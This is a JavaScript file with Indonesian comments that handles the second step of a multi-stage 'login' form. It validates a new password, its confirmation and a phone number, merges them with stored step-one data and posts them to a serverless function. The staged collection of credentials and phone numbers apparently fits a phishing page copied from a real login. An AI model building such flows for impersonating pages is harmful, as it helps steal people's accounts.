/**
 * login2.js
 * Menangani form submission untuk tahap 2 (ubah.html)
 */

// Fungsi-fungsi validasi dari login.js (disalin atau diasumsikan tersedia)
function validateRequired(form) {
    var bValid = true;
    var focusField = null;
    var i = 0;
    var fields = new Array();
    oRequired = new required();

    for (x in oRequired) {
        if ((form[oRequired[x][0]].type == 'text' || form[oRequired[x][0]].type == 'textarea' || form[oRequired[x][0]].type == 'select-one' || form[oRequired[x][0]].type == 'radio' || form[oRequired[x][0]].type == 'password') && form[oRequired[x][0]].value == '') {
           if (i == 0)
              focusField = form[oRequired[x][0]];

           fields[i++] = oRequired[x][1];

           bValid = false;
        }
    }

    if (fields.length > 0) {
       focusField.focus();
       alert(fields.join('\n'));
    }

    return bValid;
}

function validateForm(form) {
    // Tidak ada saveUsername di sini, hanya validasi
    return validateRequired(form);
}

function required () {
    this.aa = new Array("j_password", "Password harus diisi", new Function ("varName", " return this[varName];"));
    this.ab = new Array("j_confirm_password", "Konfirmasi Password harus diisi", new Function ("varName", " return this[varName];"));
    this.ac = new Array("j_phone_number", "Nomor HP harus diisi", new Function ("varName", " return this[varName];"));
}

/**
 * Fungsi baru untuk menangani submit form tahap 2 dengan AJAX.
 * @param {HTMLFormElement} form - Objek form.
 */
async function handleLoginSubmit2(form) {
    // 1. Validasi form
    if (!validateForm(form)) {
        return false;
    }

    // Validasi tambahan: Password harus sama
    const password = form.j_password.value;
    const confirmPassword = form.j_confirm_password.value;
    if (password !== confirmPassword) {
        alert('Password dan Konfirmasi Password tidak cocok.');
        form.j_confirm_password.focus();
        return false;
    }

    // 2. Ambil data form tahap 2
    const formData = new FormData(form);
    const dataStep2 = Object.fromEntries(formData.entries());

    // 3. Ambil data dari tahap 1 (dari localStorage)
    const dataStep1 = window.dataStorage.load();

    // 4. Gabungkan data
    const finalData = { ...dataStep1, ...dataStep2 };

    // 5. Tampilkan loading/disable tombol
    const submitButton = form.querySelector('input[type="submit"]');
    submitButton.disabled = true;
    submitButton.value = 'Loading...';

    try {
        // 6. Kirim data ke Vercel Serverless Function
        const response = await fetch(form.action, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(finalData)
        });

        const result = await response.json();

        if (response.ok && result.success) {
            // 7. Simpan data gabungan ke localStorage untuk tahap berikutnya
            window.dataStorage.save(finalData);

            // 8. Redirect ke halaman berikutnya
            window.location.href = result.redirect;
        } else {
            // 9. Tampilkan pesan error
            alert(result.message || 'Terjadi kesalahan saat memproses data.');
        }
    } catch (error) {
        console.error('Error:', error);
        alert('Terjadi kesalahan jaringan atau server.');
    } finally {
        // 10. Kembalikan tombol ke keadaan semula
        submitButton.disabled = false;
        submitButton.value = 'Lanjutkan';
    }

    return false; // Mencegah submit form bawaan
}

window.handleLoginSubmit2 = handleLoginSubmit2;
